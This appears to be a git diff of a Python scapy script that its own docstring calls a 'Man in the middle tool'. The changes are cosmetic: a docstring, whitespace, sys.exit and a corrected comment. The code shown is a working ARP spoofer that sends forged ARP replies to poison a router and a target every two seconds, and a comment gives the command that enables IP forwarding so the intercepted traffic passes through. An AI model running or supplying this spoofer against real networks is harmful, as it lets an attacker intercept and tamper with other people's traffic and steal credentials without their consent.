@@ -1,8 +1,11 @@
 # -*- Coding : utf-8 -*-
 
+"""
+    Man in the middle tool.
+"""
+
 import scapy.all as scapy
 import sys, time
-
 
 def get_mac_address(ip_address):
     broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -11,7 +14,6 @@ def get_mac_address(ip_address):
 
     answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
     return answer[0][1].hwsrc
-
 
 def spoof(router_ip, target_ip, router_mac, target_mac):
     router_packet = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
@@ -30,6 +32,6 @@ try:
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[x] Closing ARP spoofer")
-    exit(0)
+    sys.exit(0)
 
-# echo 1 >> /proc/sys/net/ipv4/ip_forward
+# echo 1 > /proc/sys/net/ipv4/ip_forward
